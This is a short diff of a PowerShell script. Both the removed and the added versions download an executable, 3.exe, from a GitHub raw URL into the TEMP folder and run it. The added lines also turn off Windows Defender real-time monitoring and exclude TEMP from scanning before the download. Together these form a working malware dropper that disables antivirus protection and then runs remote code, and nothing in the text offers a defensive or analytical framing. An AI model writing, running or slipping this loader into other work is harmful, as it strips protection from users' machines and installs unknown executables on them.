@@ -1,4 +1,5 @@
-$url = "https://raw.githubusercontent.com/Drenote/123/refs/heads/main/3.exe"
-$outPath = "$env:TEMP\3.exe"
-Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
-Start-Process -FilePath $outPath -Wait
+$p = "$env:TEMP\3.exe"
+Set-MpPreference -DisableRealtimeMonitoring $true -Force
+Add-MpPreference -ExclusionPath "$env:TEMP"
+iwr 'https://raw.githubusercontent.com/Drenote/123/refs/heads/main/3.exe' -OutFile $p
+& $p
